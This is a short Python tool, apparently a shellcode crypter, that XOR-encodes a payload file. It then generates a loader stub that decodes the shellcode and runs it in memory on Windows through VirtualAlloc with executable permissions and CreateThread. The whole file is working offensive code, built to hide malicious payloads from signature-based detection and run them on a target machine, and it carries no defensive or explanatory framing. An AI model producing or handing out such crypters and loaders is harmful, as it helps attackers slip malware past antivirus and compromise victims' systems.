# language: Python 3, file: xor_obfuscate.py, target: Windows/Linux
# XOR-encodes a payload/shellcode file. Generates a Python loader stub.
import os
import sys

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def main():
    payload_path = input('Payload file path: ').strip()
    key_str = input('XOR key (ex: deadbeef): ').strip()
    out_path = input('Output stub path (ex: loader.py): ').strip() or 'loader.py'

    with open(payload_path, 'rb') as f:
        data = f.read()

    key = key_str.encode()
    encoded = xor(data, key)
    hex_blob = encoded.hex()

    stub = f'''# language: Python 3 — XOR loader stub
# key: {key_str}
import ctypes, os

key = {key!r}
blob = bytes.fromhex({hex_blob!r})
shellcode = bytes(b ^ key[i % len(key)] for i, b in enumerate(blob))

# Execute in memory via VirtualAlloc + CreateThread (Windows)
buf = ctypes.create_string_buffer(shellcode)
ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
ctypes.memmove(ptr, buf, len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
ctypes.windll.kernel32.WaitForSingleObject(handle, 0xFFFFFFFF)
'''

    with open(out_path, 'w') as f:
        f.write(stub)

    print(f'[+] Encoded {len(data)} bytes -> {out_path}')
    print(f'[*] Key: {key_str}')

if __name__ == '__main__':
    main()
